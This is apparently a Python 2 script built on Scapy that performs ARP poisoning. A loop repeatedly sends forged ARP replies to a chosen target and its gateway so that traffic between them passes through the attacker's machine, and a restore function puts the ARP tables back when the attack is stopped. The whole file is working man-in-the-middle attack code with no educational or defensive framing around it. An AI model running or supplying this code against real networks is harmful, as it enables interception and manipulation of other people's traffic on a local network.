from scapy.all import *
import os
import requests

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print "[*] Restoring network..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

def poisoner(gateway_ip,gateway_mac,target_ip,target_mac, stop):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print "[*] Starting ARP-Poisoning. [CTRL-C to stop]"

    while True:
        send(poison_target)
        send(poison_gateway)
        time.sleep(2)
        if stop():
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            print "[*] Finished ARP-Poisoning atack"
            break
    return